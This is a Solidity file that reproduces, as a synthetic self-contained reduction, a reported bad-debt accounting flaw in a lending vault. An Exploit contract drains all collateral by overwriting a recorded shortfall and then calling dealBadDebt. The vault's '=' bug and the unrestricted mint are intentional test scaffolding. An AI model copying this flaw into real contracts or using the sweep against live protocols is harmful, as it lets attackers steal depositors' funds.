// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Term Structure — _badDebtMapping[collateral] overwritten (Cantina, Feb 2025)
    SYNTHETIC, cheatcode-free reduction of _redeemFromMarket / dealBadDebt.
    Two shortfalls on the same collateral use `=` instead of `+=`.
    The second write replaces 900 with 10. dealBadDebt then pays
    amount * collateralBalance / badDebtAmt and sweeps all 910 collateral. */

contract ERC20 {
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract TermVault {
    ERC20 public collateral;
    mapping(address => uint256) public badDebtMapping;

    constructor(ERC20 c) {
        collateral = c;
    }

    function redeemFromMarket(uint256 ftReserve, uint256 totalRedeem) external {
        if (totalRedeem < ftReserve) {
            address coll = address(collateral);
            badDebtMapping[coll] = ftReserve - totalRedeem; // @> VULN: replaces the previous shortfall instead of adding to it
        }
    }

    function dealBadDebt(address recipient, address coll, uint256 amount) external returns (uint256 collateralOut) {
        uint256 badDebtAmt = badDebtMapping[coll]; // S4 denominator is the overwritten value
        require(badDebtAmt != 0, "no debt");
        require(amount <= badDebtAmt, "amount");
        uint256 collateralBalance = ERC20(coll).balanceOf(address(this));
        collateralOut = (amount * collateralBalance) / badDebtAmt; // S5
        ERC20(coll).transfer(recipient, collateralOut);
        badDebtMapping[coll] -= amount;
    }
}

contract Exploit {
    uint256 public constant FINDING = 54897;
    ERC20 public collateral;
    TermVault public vault;
    uint256 public swept;

    constructor() {
        collateral = new ERC20("COLL", 18);
        vault = new TermVault(collateral);
    }

    function run() external {
        collateral.mint(address(vault), 910 ether); // S1 seized for both shortfalls
        vault.redeemFromMarket(1000 ether, 100 ether); // S2 records 900
        require(vault.badDebtMapping(address(collateral)) == 900 ether, "first");
        vault.redeemFromMarket(100 ether, 90 ether); // S3 overwrites with 10
        require(vault.badDebtMapping(address(collateral)) == 10 ether, "overwritten");
        swept = vault.dealBadDebt(address(this), address(collateral), 10 ether);
        require(swept == 910 ether, "swept");
        require(collateral.balanceOf(address(this)) == 910 ether, "attacker");
        require(collateral.balanceOf(address(vault)) == 0, "vault empty");
        require(vault.badDebtMapping(address(collateral)) == 0, "cleared");
    }
}
